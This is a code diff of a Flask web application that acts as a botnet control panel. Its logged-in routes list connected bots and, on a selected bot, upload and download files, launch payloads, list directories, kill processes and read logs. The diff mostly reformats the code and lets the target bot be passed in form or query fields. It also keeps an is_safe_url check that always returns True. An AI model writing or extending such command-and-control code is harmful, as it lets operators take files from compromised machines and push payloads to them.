@@ -49,9 +49,11 @@ login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = "login"
 
+
 @login_manager.user_loader
 def load_user(user_id):
     return UserManager.get(user_id)
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -79,17 +81,21 @@ def login():
             errs.append("Invalid login")
     return flask.render_template('login.html',errors=errs)
 
+
 @app.route("/logout")
 @login_required
 def logout():
     flask_login.logout_user()
     return flask.redirect('/login')
 
+
 # Research more
 def is_safe_url(next):
     return True
 
+
 # Done with login stuff
+
 
 @app.route("/bots", methods=['GET'])
 @login_required
@@ -101,6 +107,7 @@ def get_bots():
         botstr = json.dumps(botnet.getConnectionDetails())
         return flask.Response(botstr, status=200, mimetype='application/json')
 
+
 @app.route('/kill', methods=['POST','GET'])
 @login_required
 def kill_proc():
@@ -109,6 +116,7 @@ def kill_proc():
         return json.dumps({"success": True})
     return json.dumps({"success": False})
 
+
 @app.route('/clear', methods=['POST','GET'])
 @login_required
 def clearLog():
@@ -116,6 +124,7 @@ def clearLog():
         botnet.clearLog(request.cookies.get('bot'))
         return json.dumps({"success": True})
     return json.dumps({"success": False})
+
 
 @app.route('/uploader', methods=['POST'])
 @login_required
@@ -126,7 +135,6 @@ def upload_file():
         botnet.sendFile(request.cookies.get('bot'),f.filename,f)
         return json.dumps({"success": True})
     return json.dumps({"success": False})
-    # TODO switch to in-progress instead of "success"
 
 
 @app.route('/downloader', methods=['GET','POST','DELETE'])
@@ -140,11 +148,13 @@ def download_file():
     '''
     if request.method == 'POST':
         filename = request.form.get('file')
-        if 'bot' in request.cookies:
+        if 'bot' in request.form:
+            botnet.startFileDownload(request.form.get('bot'), filename)
+        elif 'bot' in request.cookies:
             botnet.startFileDownload(request.cookies.get('bot'), filename)
-            return "done"
         else:
             return "No bot selected", 404
+        return "done"
     elif request.method == 'GET':
         if 'file' in request.args:
             if 'user' in request.args:
@@ -182,14 +192,17 @@ def download_file():
 def payload_launch():
     if request.method == 'POST' and 'payload' in request.form:
         payload_name = request.form.get('payload')
-        if 'bot' in request.cookies:
+        if 'bot' in request.form:
+            botnet.sendPayload(request.form.get('bot'), payload_name, request.form.to_dict())
+        elif 'bot' in request.cookies:
             botnet.sendPayload(request.cookies.get('bot'), payload_name, request.form.to_dict())
-            return "done"
         else:
             return "No bot selected", 404
+        return "done"
     elif request.method == 'GET':
         payloadstr = json.dumps(botnet.getPayloads())
         return flask.Response(payloadstr, status=200, mimetype='application/json')
+
 
 @app.route('/ls', methods=['GET','POST'])
 @login_required
@@ -198,11 +211,16 @@ def list_dir():
         filename = request.form.get('file')
     else:
         filename = '.'
-    if 'bot' in request.cookies:
+    if 'bot' in request.form:
+        botnet.requestLs(request.form.get('bot'), filename)
+    elif 'bot' in request.args:
+        botnet.requestLs(request.args.get('bot'), filename)
+    elif 'bot' in request.cookies:
         botnet.requestLs(request.cookies.get('bot'), filename)
-        return "done"
     else:
         return "No bot selected", 404
+    return "done"
+
 
 @app.route('/choose', methods=['POST'])
 @login_required
@@ -211,6 +229,7 @@ def setbot():
     if 'bot' in request.form:
         resp.set_cookie('bot', request.form.get('bot'))
     return resp
+
 
 @app.route('/index')
 @app.route('/')
@@ -233,8 +252,8 @@ def index():
 def resend_log():
     if request.method == 'POST':
         connected = ''
-        if 'user' in request.form:
-            connected = request.form.get('user')
+        if 'bot' in request.form:
+            connected = request.form.get('bot')
         elif 'bot' in request.cookies:
             connected = request.cookies.get('bot')
         filestr = json.dumps(botnet.getLog(connected))
